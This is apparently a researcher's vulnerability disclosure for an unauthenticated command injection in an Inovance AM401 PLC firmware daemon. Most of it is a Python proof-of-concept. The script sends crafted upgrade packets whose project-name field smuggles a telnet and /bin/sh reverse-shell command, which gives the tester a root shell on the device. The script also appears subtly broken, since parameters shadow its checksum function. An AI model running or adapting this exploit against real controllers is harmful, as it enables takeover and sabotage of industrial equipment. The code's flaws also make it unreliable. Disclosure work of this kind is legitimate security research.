# Summary
Inovance is a listed technology company focusing on industrial automation control and drive technologies. It is also a global solution provider of optics, mechanics, electricity, hydraulics and pneumatics integrating drive, control, motors and precision machinery.

Inovance's AM401_CPU1608TPTN PLC was found to have an unauthorized arbitrary code execution vulnerability.

**Affected firmware versions:** HCPLC_AM401-CPU1608TPTN_21.38.0.0

# Vulnerability Analysis
You can download this firmware at this link: https://n0zom1z0.lanzoup.com/iDHbZ2akjusf
or https://github.com/N0zoM1z0/Vuln-Search/blob/main/HCPLC_AM401-CPU1608TPTN_21.38.0.0.upgrade

The vulnerability is in the am600_daemon binary file: 
![image](https://github.com/user-attachments/assets/12cf203f-6113-4cad-963f-b598704cef13)

The ExecuteUserProgramUpgrade function concatenates `userFileOfUpgrade.usrHeader.appName` in the data packet to the appName string, 
and then directly executes the `system(appName) command` without filtering the appName parameter, resulting in a command injection vulnerability.


# Vulnerability reproduction
1. Configure the test machine IP to 192.168.1.100, the tested device AM401-CPU1608TP IP to 192.168.1.88, and connect the test machine directly to the tested device. As shown in the figure below:
![image](https://github.com/user-attachments/assets/99b85fd6-5048-478a-b9e7-e239c450528d)

2. Use python3 to run the vulnerability trigger script "poc.py" on the test machine. No username or password is required. Use nc to listen to the port on the test machine to obtain the shell returned by the device under test with **root privileges**.
![image](https://github.com/user-attachments/assets/e61944f5-565f-4cd9-a99c-6310ec18cd16)
![image](https://github.com/user-attachments/assets/e9295534-7a06-4c5a-b001-095df08da049)
![image](https://github.com/user-attachments/assets/524d170a-69bc-43e8-8a09-fb683dc6418e)

# poc.py
```py
import socket,zlib
from time import sleep
def a(a):
    b=65535
    for c in a:
        b^=c
        for d in range(8):
            if((b&1)!=0):
                b=(b>>1)^40961
            else:
                b>>=1
    return b
def b(a,b,c):
    d=a.to_bytes(length=1,byteorder="big",signed=False)
    e=b.to_bytes(length=4,byteorder="big",signed=False)
    f=(len(e)+2).to_bytes(length=2,byteorder="big",signed=False)
    g=b'\xca'+b'\x00\x01'+b'\x00\x05'+b'\x00\x01'+f+d+e+b'\x00'
    h=a(g)
    g+=h.to_bytes(length=2,byteorder='big',signed=False)+b'\xea'
    sleep(0.2)
    c.send(g)
    return c.recv(1024)[9:13]
def c(a,b,c):
    d=a.to_bytes(length=1,byteorder="big",signed=False)
    e=len(b).to_bytes(length=2,byteorder="big",signed=False)
    f=(len(e+b)+2).to_bytes(length=2,byteorder="big",signed=False)
    g=b'\xca'+b'\x00\x01'+b'\x00\x05'+b'\x00\x02'+f+d+e+b+b'\x00'
    h=a(g)
    g+=h.to_bytes(length=2,byteorder='big',signed=False)+b'\xea'
    sleep(0.2)
    c.send(g)
    i=c.recv(1024)
    return print(i)
def d(b):
    c=b'\xca'+b'\x00\x01'+b'\x00\x03'+b'\x00\x05'+b'\x00\x00'+b'\x00'
    d=a(c)
    c+=d.to_bytes(length=2,byteorder='big',signed=False)+b'\xea'
    sleep(0.2)
    b.send(c)
    e=b.recv(1024)
    return e
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
f=("192.168.1.88",10855)
s.connect(f)
g=b';mknod a p; telnet 192.168.1.100 8888 0<a | /bin/sh 1>a;#'
h=len(g).to_bytes(length=1,byteorder='little',signed=False)
i=b'\x0b'+b'projectName'+h+g+b'\x07'+b'cpyName'+b'\x0a'+b'authorName'+b'\x07'+b'verName'+b'\x07\x00'+b'usrInfo'+b'\x08'+b'tpyeName'+b'\x00\x00\x00\x00'+b'\x00\x00\x00\x00'+b'\x00\x00\x00\x00'+b'\x00'*20
j=(len(i)+2).to_bytes(length=2,byteorder='little',signed=False)
k=b'\x01'+b'\x00\x00\x00\x01'+b'\x00'
l=(len(k)+4).to_bytes(length=4,byteorder='little',signed=False)
m=b'UserProgram'+j+i+l+k
n=zlib.crc32(m).to_bytes(length=4,byteorder='little',signed=False)
m+=n
o=b(2,len(m),s)
o=int.from_bytes(o,byteorder='big',signed=False)
if o==0:
    c(2,m,s)
    d(s)

```

# Discoverers
ylqncepu@163.com

https://github.com/N0zoM1z0
